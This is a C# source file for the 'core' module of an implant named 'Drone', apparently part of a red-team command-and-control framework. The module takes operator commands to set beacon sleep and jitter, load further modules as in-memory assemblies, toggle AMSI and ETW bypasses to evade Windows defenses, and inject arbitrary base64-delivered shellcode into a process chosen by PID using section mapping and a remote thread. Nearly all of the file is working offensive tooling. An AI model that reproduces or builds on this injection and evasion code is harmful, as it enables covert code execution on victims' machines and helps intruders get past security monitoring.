using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Threading;
using Drone.DInvoke.Injection;
using Drone.Models;

namespace Drone.Modules
{
    public class CoreModule : DroneModule
    {
        public override string Name => "core";

        public override List<Command> Commands => new List<Command>
        {
            new ("sleep", "Set sleep interval and jitter", SetSleep, new List<Command.Argument>
            {
                new ("interval", false),
                new ("jitter")
            }),
            new ("load-module", "Load an external Drone module", LoadModule, new List<Command.Argument>
            {
                new ("/path/to/module.dll", false, true)
            }),
            new ("bypass", "Set a directive to bypass AMSI/ETW on tasks", SetBypass, new List<Command.Argument>
            {
                new("amsi/etw", false),
                new("true/false")
            }),
            new("shinject", "Inject arbitrary shellcode into a process", ShellcodeInject, new List<Command.Argument>
            {
                new("/path/to/shellcode.bin", false, true),
                new("pid", false)
            }),
            new ("exit", "Exit this Drone", ExitDrone)
        };

        private void SetSleep(DroneTask task, CancellationToken token)
        {
            Config.SetConfig("SleepInterval", Convert.ToInt32(task.Arguments[0]));
            
            if (task.Arguments.Length > 1)
                Config.SetConfig("SleepJitter", Convert.ToInt32(task.Arguments[1]));
        }

        private void LoadModule(DroneTask task, CancellationToken token)
        {
            var bytes = Convert.FromBase64String(task.Artefact);
            var transact = new TransactedAssembly();
            var asm = transact.Load(bytes);
            
            Drone.LoadDroneModule(asm);
        }

        private void SetBypass(DroneTask task, CancellationToken token)
        {
            var config = "";

            if (task.Arguments[0].Equals("amsi", StringComparison.OrdinalIgnoreCase))
                config = "BypassAmsi";

            if (task.Arguments[0].Equals("etw", StringComparison.OrdinalIgnoreCase))
                config = "BypassEtw";

            if (string.IsNullOrEmpty(config))
            {
                Drone.SendError(task.TaskGuid, "Not a valid configuration option");
                return;
            }

            var current = Config.GetConfig<bool>(config);

            if (task.Arguments.Length == 2)
            {
                if (!bool.TryParse(task.Arguments[1], out var enabled))
                {
                    Drone.SendError(task.TaskGuid, $"{task.Arguments[1]} is not a value bool");
                    return;
                }

                Config.SetConfig(config, enabled);
                current = Config.GetConfig<bool>(config);
            }

            Drone.SendResult(task.TaskGuid, $"{config} is {current}");
        }
        
        private void ShellcodeInject(DroneTask task, CancellationToken token)
        {
            if (!int.TryParse(task.Arguments[0], out var pid))
            {
                Drone.SendError(task.TaskGuid, "Not a valid PID");
                return;
            }

            var process = Process.GetProcessById(pid);

            var shellcode = Convert.FromBase64String(task.Artefact);
            var payload = new PICPayload(shellcode);
            var alloc = new SectionMapAlloc();
            var exec = new RemoteThreadCreate();

            var success = Injector.Inject(payload, alloc, exec, process);

            if (success)
            {
                Drone.SendResult(task.TaskGuid, $"Successfully injected {shellcode.Length} bytes into {process.ProcessName}");
                return;
            }
            
            Drone.SendError(task.TaskGuid, $"Failed to inject into {process.ProcessName}");
        }

        private void ExitDrone(DroneTask task, CancellationToken token)
        {
            Drone.Stop();
        }
    }
}